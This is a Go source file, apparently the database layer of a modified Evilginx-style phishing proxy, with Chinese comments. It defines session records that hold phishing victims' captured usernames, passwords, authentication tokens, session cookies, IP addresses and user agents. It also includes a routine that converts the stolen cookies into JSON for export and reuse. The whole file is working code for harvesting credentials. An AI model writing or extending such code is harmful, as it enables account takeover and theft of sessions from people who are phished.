package database

import (
	"encoding/json"
	"fmt"
	"time"

	"github.com/tidwall/buntdb"
)

// 这里修改为你的表名常量
const SessionTable = "sessions"

// CookieItem 用来在前端、或 CSV 导出时更直观地表示单条 Cookie
type CookieItem struct {
	Domain   string `json:"domain"`
	Name     string `json:"name"`
	Value    string `json:"value"`
	Path     string `json:"path"`
	HttpOnly bool   `json:"httpOnly"`
}

// Session 数据库中的会话记录
type Session struct {
	Id           int                                `json:"id"`
	Phishlet     string                             `json:"phishlet"`
	LandingURL   string                             `json:"landing_url"`
	Username     string                             `json:"username"`
	Password     string                             `json:"password"`
	Custom       map[string]string                  `json:"custom"`
	BodyTokens   map[string]string                  `json:"body_tokens"`
	HttpTokens   map[string]string                  `json:"http_tokens"`
	CookieTokens map[string]map[string]*CookieToken `json:"tokens"` // 这里依然保存着原始的多重映射
	SessionId    string                             `json:"session_id"`
	UserAgent    string                             `json:"useragent"`
	RemoteAddr   string                             `json:"remote_addr"`
	CreateTime   int64                              `json:"create_time"`
	UpdateTime   int64                              `json:"update_time"`

	// CookiesJson 存放序列化后的 Cookies 供前端直接使用（你可以在 handleSessions 中或 sessionsUpdateCookieTokens 时生成它）
	CookiesJson string `json:"cookies_json,omitempty"`
}

// CookieToken 是具体保存到 CookieTokens 里面的结构
type CookieToken struct {
	Name     string
	Value    string
	Path     string
	HttpOnly bool
}

// sessionsInit 建立索引
func (d *Database) sessionsInit() {
	d.db.CreateIndex("sessions_id", SessionTable+":*", buntdb.IndexJSON("id"))
	d.db.CreateIndex("sessions_sid", SessionTable+":*", buntdb.IndexJSON("session_id"))
}

// SessionsCreate 新建一个 Session
func (d *Database) SessionsCreate(sid string, phishlet string, landing_url string, useragent string, remote_addr string) (*Session, error) {
	// 防止重复
	_, err := d.sessionsGetBySid(sid)
	if err == nil {
		return nil, fmt.Errorf("session already exists: %s", sid)
	}

	id, _ := d.getNextId(SessionTable)

	s := &Session{
		Id:           id,
		Phishlet:     phishlet,
		LandingURL:   landing_url,
		Username:     "",
		Password:     "",
		Custom:       make(map[string]string),
		BodyTokens:   make(map[string]string),
		HttpTokens:   make(map[string]string),
		CookieTokens: make(map[string]map[string]*CookieToken),
		SessionId:    sid,
		UserAgent:    useragent,
		RemoteAddr:   remote_addr,
		CreateTime:   time.Now().UTC().Unix(),
		UpdateTime:   time.Now().UTC().Unix(),
	}

	jf, _ := json.Marshal(s)

	err = d.db.Update(func(tx *buntdb.Tx) error {
		_, _, e2 := tx.Set(d.genIndex(SessionTable, id), string(jf), nil)
		return e2
	})

	if err != nil {
		return nil, err
	}
	return s, nil
}

// sessionsList 返回全部 Session
func (d *Database) sessionsList() ([]*Session, error) {
	sessions := []*Session{}
	err := d.db.View(func(tx *buntdb.Tx) error {
		tx.Ascend("sessions_id", func(key, val string) bool {
			s := &Session{}
			if err := json.Unmarshal([]byte(val), s); err == nil {
				sessions = append(sessions, s)
			}
			return true
		})
		return nil
	})
	if err != nil {
		return nil, err
	}
	return sessions, nil
}

// GetAllSessions 供外部直接拿到全部的 Sessions
func (d *Database) GetAllSessions() ([]*Session, error) {
	return d.sessionsList()
}

// sessionsUpdateUsername 更新用户名
func (d *Database) sessionsUpdateUsername(sid string, username string) error {
	s, err := d.sessionsGetBySid(sid)
	if err != nil {
		return err
	}
	s.Username = username
	s.UpdateTime = time.Now().UTC().Unix()

	return d.sessionsUpdate(s.Id, s)
}

// sessionsUpdatePassword 更新密码
func (d *Database) sessionsUpdatePassword(sid string, password string) error {
	s, err := d.sessionsGetBySid(sid)
	if err != nil {
		return err
	}
	s.Password = password
	s.UpdateTime = time.Now().UTC().Unix()

	return d.sessionsUpdate(s.Id, s)
}

// sessionsUpdateCustom 更新 custom
func (d *Database) sessionsUpdateCustom(sid string, name string, value string) error {
	s, err := d.sessionsGetBySid(sid)
	if err != nil {
		return err
	}
	s.Custom[name] = value
	s.UpdateTime = time.Now().UTC().Unix()

	return d.sessionsUpdate(s.Id, s)
}

// sessionsUpdateBodyTokens 更新 body_tokens
func (d *Database) sessionsUpdateBodyTokens(sid string, tokens map[string]string) error {
	s, err := d.sessionsGetBySid(sid)
	if err != nil {
		return err
	}
	s.BodyTokens = tokens
	s.UpdateTime = time.Now().UTC().Unix()

	return d.sessionsUpdate(s.Id, s)
}

// sessionsUpdateHttpTokens 更新 http_tokens
func (d *Database) sessionsUpdateHttpTokens(sid string, tokens map[string]string) error {
	s, err := d.sessionsGetBySid(sid)
	if err != nil {
		return err
	}
	s.HttpTokens = tokens
	s.UpdateTime = time.Now().UTC().Unix()

	return d.sessionsUpdate(s.Id, s)
}

// convertCookieTokensToList 把 map[domain]map[key]*CookieToken 转成一个“扁平”的 []map[string]interface{}
// 这样方便我们进行 JSON 处理或 CSV 导出
func convertCookieTokensToList(tokens map[string]map[string]*CookieToken) []map[string]interface{} {
	var cookieList []map[string]interface{}
	for domain, tkMap := range tokens {
		for key, tk := range tkMap {
			item := map[string]interface{}{
				"domain":   domain,
				"name":     key,
				"value":    tk.Value,
				"path":     tk.Path,
				"httpOnly": tk.HttpOnly,
			}
			cookieList = append(cookieList, item)
		}
	}
	return cookieList
}

// sessionsUpdateCookieTokens 用于把 CookieTokens 更新到数据库中
func (d *Database) sessionsUpdateCookieTokens(sid string, tokens map[string]map[string]*CookieToken) error {
	s, err := d.sessionsGetBySid(sid)
	if err != nil {
		return err
	}
	s.CookieTokens = tokens
	s.UpdateTime = time.Now().UTC().Unix()

	// 转成 JSON 存到 s.CookiesJson 里面，方便前端直接获取
	rawBytes, _ := json.Marshal(convertCookieTokensToList(tokens))
	s.CookiesJson = string(rawBytes)

	return d.sessionsUpdate(s.Id, s)
}

// sessionsUpdate 更新单条记录
func (d *Database) sessionsUpdate(id int, s *Session) error {
	jf, _ := json.Marshal(s)

	return d.db.Update(func(tx *buntdb.Tx) error {
		// 用 _, _, err 方式接收所有返回值
		_, _, err := tx.Set(d.genIndex(SessionTable, id), string(jf), nil)
		return err
	})
}

// SessionsDeleteOne 删除单条记录(公共方法,可在后端或前端一次删一条)
func (d *Database) SessionsDeleteOne(id int) error {
	return d.db.Update(func(tx *buntdb.Tx) error {
		_, err := tx.Delete(d.genIndex(SessionTable, id))
		return err
	})
}

// SessionsDelete 一次性删除多条记录(公共方法)
func (d *Database) SessionsDelete(ids []int) error {
	return d.db.Update(func(tx *buntdb.Tx) error {
		for _, id := range ids {
			_, err := tx.Delete(d.genIndex(SessionTable, id))
			if err != nil {
				// 如果有报错,中断
				return err
			}
		}
		return nil
	})
}

// sessionsGetById 根据整型 ID 获取一条 Session
func (d *Database) sessionsGetById(id int) (*Session, error) {
	s := &Session{}
	err := d.db.View(func(tx *buntdb.Tx) error {
		found := false
		err := tx.AscendEqual("sessions_id", d.getPivot(map[string]int{"id": id}), func(key, val string) bool {
			_ = json.Unmarshal([]byte(val), s)
			found = true
			return false
		})
		if !found {
			return fmt.Errorf("session ID not found: %d", id)
		}
		return err
	})
	if err != nil {
		return nil, err
	}
	return s, nil
}

// sessionsGetBySid 根据字符串 session_id 获取一条 Session
func (d *Database) sessionsGetBySid(sid string) (*Session, error) {
	s := &Session{}
	err := d.db.View(func(tx *buntdb.Tx) error {
		found := false
		err := tx.AscendEqual("sessions_sid", d.getPivot(map[string]string{"session_id": sid}), func(key, val string) bool {
			_ = json.Unmarshal([]byte(val), s)
			found = true
			return false
		})
		if !found {
			return fmt.Errorf("session not found: %s", sid)
		}
		return err
	})
	if err != nil {
		return nil, err
	}
	return s, nil
}
